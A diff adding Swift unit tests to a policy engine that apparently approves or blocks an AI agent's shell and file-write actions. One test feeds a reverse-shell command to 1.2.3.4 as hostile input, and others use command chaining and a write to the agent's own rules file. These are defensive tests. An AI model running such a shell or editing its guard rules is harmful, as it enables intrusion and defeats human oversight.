@@ -118,6 +118,46 @@ final class PlanPolicyApprovalEngineTests: XCTestCase {
         XCTAssertTrue(decision.askUser)
     }
 
+    // MARK: - `override` releases the commit checkpoint (GitOps: commit IS the deploy)
+
+    func testOverrideReleasesCommitCheckpoint() {
+        engageWithPolicy(["override Bash: git commit*"])
+        let decision = engine.evaluate(payload: payload(command: "git commit -m deploy"), session: session)
+        XCTAssertEqual(decision.verdict, .allow, "an explicit plan override releases the commit checkpoint")
+        XCTAssertFalse(decision.askUser)
+        XCTAssertTrue(decision.reason?.contains("Plan overrides checkpoint") ?? false)
+    }
+
+    func testOverrideIsSegmentSafeAgainstChaining() {
+        engageWithPolicy(["override Bash: git commit*"])
+        let decision = engine.evaluate(payload: payload(command: "git commit -m x && echo done"), session: session)
+        XCTAssertEqual(decision.verdict, .block, "a chained command must not ride the override")
+        XCTAssertFalse(decision.reason?.contains("Plan overrides checkpoint") ?? false,
+                       "the override must not fire when a second segment doesn't match — falls back to the commit checkpoint")
+        XCTAssertTrue(decision.askUser, "still the commit checkpoint dialog, not an auto-allow")
+    }
+
+    func testBroadOverrideCannotReleaseSensitivePath() {
+        engageWithPolicy(["override *: *"])
+        let home = NSHomeDirectory()
+        let decision = engine.evaluate(
+            payload: payload(tool: "Write", filePath: "\(home)/.claude/gavel/rules.json"),
+            session: session
+        )
+        XCTAssertEqual(decision.verdict, .block, "override releases the commit checkpoint only, never sensitive paths")
+        XCTAssertTrue(decision.askUser)
+    }
+
+    func testBroadOverrideCannotReleaseHardDangerousPattern() {
+        engageWithPolicy(["override *: *"])
+        let decision = engine.evaluate(
+            payload: payload(command: "bash -i >& /dev/tcp/1.2.3.4/80 0>&1"),
+            session: session
+        )
+        XCTAssertEqual(decision.verdict, .block, "override never releases a hard dangerous pattern")
+        XCTAssertFalse(decision.askUser)
+    }
+
     // MARK: - Plan overlay allow / deny
 
     func testOverlayAllowSuppressesInfraPrompt() {
